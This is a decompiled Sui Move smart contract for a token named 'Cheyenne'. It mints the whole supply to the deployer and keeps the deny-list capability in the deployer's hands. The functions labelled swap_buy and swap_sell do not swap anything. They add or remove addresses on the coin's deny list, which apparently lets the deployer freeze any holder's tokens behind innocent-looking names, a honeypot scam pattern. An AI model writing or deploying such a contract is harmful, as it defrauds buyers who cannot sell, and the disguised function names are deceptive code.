module 0xab459f8b1f30456c68664cbf876dd39e2413b01b20c6e61adfbbc4553ed0df8::cheyenne {
    struct CHEYENNE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHEYENNE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHEYENNE>(arg0, 9, b"Cheyenne", b"Cheyenne", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmet2g7BaHGWDxQ4uGv4vmLbZyTmfVqUA2Dbiw63vZSguh"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHEYENNE>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHEYENNE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHEYENNE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHEYENNE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHEYENNE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHEYENNE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHEYENNE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHEYENNE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

